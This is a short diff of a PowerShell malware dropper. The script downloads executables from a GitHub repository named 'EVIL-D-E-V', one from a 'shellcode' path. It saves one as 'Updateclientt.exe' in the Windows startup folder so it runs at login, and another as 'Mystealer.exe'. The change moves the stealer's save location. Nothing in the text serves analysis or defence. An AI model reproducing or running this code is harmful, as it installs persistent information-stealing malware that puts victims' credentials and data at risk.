@@ -11,5 +11,5 @@ $output = "$startupfolder\Updateclientt.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
 
 $url = "https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/haha.exe"
-$output = "$startupfolder\Mystealer.exe"
+$output = "$dir\Mystealer.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
